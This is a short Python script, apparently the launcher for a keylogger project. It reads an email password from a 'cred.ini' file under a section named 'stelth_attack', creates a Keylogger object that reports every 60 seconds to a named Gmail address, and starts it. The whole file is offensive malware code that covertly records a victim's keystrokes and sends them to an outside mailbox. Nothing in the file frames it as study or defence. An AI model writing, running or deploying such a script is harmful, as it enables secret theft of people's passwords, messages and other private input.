from keylogger import Keylogger
from configparser import ConfigParser
import os

config = ConfigParser()
config.read('cred.ini')
password = config['stelth_attack']['Attack_KEY']


stelth_attack=Keylogger(60,"adittyanarayan77@gmail.com",password)

stelth_attack.start()